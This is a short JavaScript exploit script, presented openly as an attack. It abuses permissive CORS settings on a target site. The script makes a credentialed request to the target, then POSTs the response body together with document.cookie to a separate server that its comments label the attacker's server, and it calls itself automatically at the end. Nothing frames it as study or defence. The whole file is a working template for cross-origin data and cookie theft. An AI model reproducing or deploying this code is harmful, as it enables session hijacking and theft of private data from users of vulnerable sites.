// Define the URL of the target where `crossdomain.xml` or CORS settings are permissive
const targetUrl = 'http://example.pro/index.php';

// Define the attacker's server where you want to send the cookies
const attackerUrl = 'http://exmaple.pro/receive_cookies';

// Function to fetch and send cookies to the attacker's server
function exploitCORSAndSendCookies() {
  fetch(targetUrl, {
    method: 'GET',
    credentials: 'include'  // Ensures cookies are included in the request
  })
  .then(response => response.text())  // Assuming we want to see the response text
  .then(data => {
    console.log('Data received:', data);  
    
    fetch(attackerUrl, {
      method: 'POST',
      body: JSON.stringify({cookies: document.cookie, data: data}),
      headers: {'Content-Type': 'application/json'}
    })
    .then(response => console.log('Cookies sent to attacker’s server'))
    .catch(error => console.error('Error sending cookies:', error));
  })
  .catch(error => console.error('Error fetching data:', error));
}

// Run the exploit function
exploitCORSAndSendCookies();
